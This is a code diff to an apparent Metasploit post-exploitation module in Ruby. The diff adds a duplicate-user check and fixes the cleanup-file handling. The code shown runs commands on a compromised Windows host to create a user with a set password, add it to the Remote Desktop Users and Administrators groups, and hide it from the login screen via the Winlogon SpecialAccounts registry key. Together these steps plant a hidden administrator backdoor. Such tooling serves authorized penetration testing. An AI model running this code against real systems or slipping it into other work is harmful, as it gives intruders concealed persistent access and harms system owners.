@@ -116,8 +116,21 @@ class Metasploit3 < Msf::Post
     print_status "Setting user account for logon"
     print_status "\tAdding User: #{username} with Password: #{password}"
     begin
+      if check_user(username)
+        print_error("\tThe user #{username} already exists")
+        return
+      end
+
+      user_added = false
       addusr_out = cmd_exec("cmd.exe", "/c net user #{username} #{password} /add")
+
       if addusr_out =~ /success/i
+        user_added = true
+      elsif check_user(username)
+        user_added = true
+      end
+
+      if user_added
         file_local_write(cleanup_rc,"execute -H -f cmd.exe -a \"/c net user #{username} /delete\"")
         print_status "\tAdding User: #{username} to local group '#{rdu}'"
         cmd_exec("cmd.exe","/c net localgroup \"#{rdu}\" #{username} /add")
@@ -125,7 +138,7 @@ class Metasploit3 < Msf::Post
         print_status "\tHiding user from Windows Login screen"
         hide_user_key = 'HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList'
         registry_setvaldata(hide_user_key,username,0,"REG_DWORD")
-        file_local_write(@dest,"reg deleteval -k HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\ NT\\\\CurrentVersion\\\\Winlogon\\\\SpecialAccounts\\\\UserList -v #{username}")
+        file_local_write(cleanup_rc,"reg deleteval -k HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\ NT\\\\CurrentVersion\\\\Winlogon\\\\SpecialAccounts\\\\UserList -v #{username}")
         print_status "\tAdding User: #{username} to local group '#{admin}'"
         cmd_exec("cmd.exe","/c net localgroup #{admin}  #{username} /add")
         print_status "You can now login with the created user"
@@ -136,8 +149,17 @@ class Metasploit3 < Msf::Post
           print_error("\t#{l.chomp}")
         end
       end
-    rescue::Exception => e
+    rescue ::Exception => e
       print_status("The following Error was encountered: #{e.class} #{e}")
     end
+  end
+
+  def check_user(user)
+    output = cmd_exec('cmd.exe', '/c net user')
+    if output.include?(user)
+        return true
+    end
+
+    false
   end
 end
